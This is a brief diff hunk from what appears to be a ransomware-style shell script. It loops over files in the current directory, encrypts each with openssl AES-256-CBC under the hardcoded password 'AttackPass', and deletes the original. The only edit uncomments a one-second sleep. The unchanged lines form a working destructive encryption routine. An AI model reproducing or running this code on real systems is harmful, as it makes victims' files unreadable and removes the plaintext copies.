@@ -31,7 +31,7 @@ do
                 `mv $CWD/$file $encrypt_filename1 2> /dev/null` && `openssl enc -aes-256-cbc -salt -in $encrypt_filename1 -out $encrypt_filename2 -pass pass:AttackPass 2> /dev/null` && `rm $encrypt_filename1 2> /dev/null`
                 if [ -f "$encrypt_filename2" ]; then
                         echo ""
-#                        sleep 1
+                        sleep 1
                 else
                         echo "Encryption failed."
                 fi
